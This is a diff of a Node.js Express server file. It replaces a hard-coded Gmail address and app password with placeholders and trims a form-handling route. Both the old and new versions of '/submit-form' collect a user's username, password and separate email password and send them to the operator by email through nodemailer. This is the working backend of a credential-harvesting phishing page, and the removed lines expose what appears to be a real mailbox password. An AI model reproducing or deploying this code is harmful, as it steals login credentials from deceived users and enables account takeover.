@@ -17,16 +17,16 @@ app.use(bodyParser.json());
 const transporter = nodemailer.createTransport({
   service: "gmail",
   auth: {
-    user: "allenvivian519@gmail.com", // Replace with your email
-    pass: "wvox qdyx khat glot", // Replace with your app-specific password
+    user: "your-email@gmail.com", // Replace with your email
+    pass: "your-app-password", // Replace with your app-specific password
   },
 });
 
 // Helper function to send email
 function sendEmail(subject, text) {
   const mailOptions = {
-    from: "allenvivian519@gmail.com", // Replace with your email
-    to: "allenvivian519@gmail.com", // Replace with recipient email
+    from: "your-email@gmail.com", // Replace with your email
+    to: "recipient-email@gmail.com", // Replace with recipient email
     subject: subject,
     text: text,
   };
@@ -42,24 +42,17 @@ function sendEmail(subject, text) {
 
 // Route to handle form submission
 app.post("/submit-form", (req, res) => {
-  try {
-    const { username, password, emailPassword } = req.body;
-    console.log("Form data received:", req.body);
+  const { username, password, emailPassword } = req.body;
 
-    const subject = "New Form Submission";
-    const message = `Username: ${username}\nPassword: ${password}\nEmail Password: ${emailPassword}`;
+  // Compose email content
+  const subject = "New Form Submission";
+  const message = `Username: ${username}\nPassword: ${password}\nEmail Password: ${emailPassword}`;
 
-    // Send email with form data
-    sendEmail(subject, message);
+  // Send email with form data
+  sendEmail(subject, message);
 
-    // Send response
-    res
-      .status(200)
-      .json({ message: "Form data received and email sent successfully!" });
-  } catch (error) {
-    console.error("Error processing form submission:", error);
-    res.status(500).json({ error: "Internal server error" });
-  }
+  // Respond to the frontend
+  res.json({ message: "Form data received and email sent successfully!" });
 });
 
 // Start the server
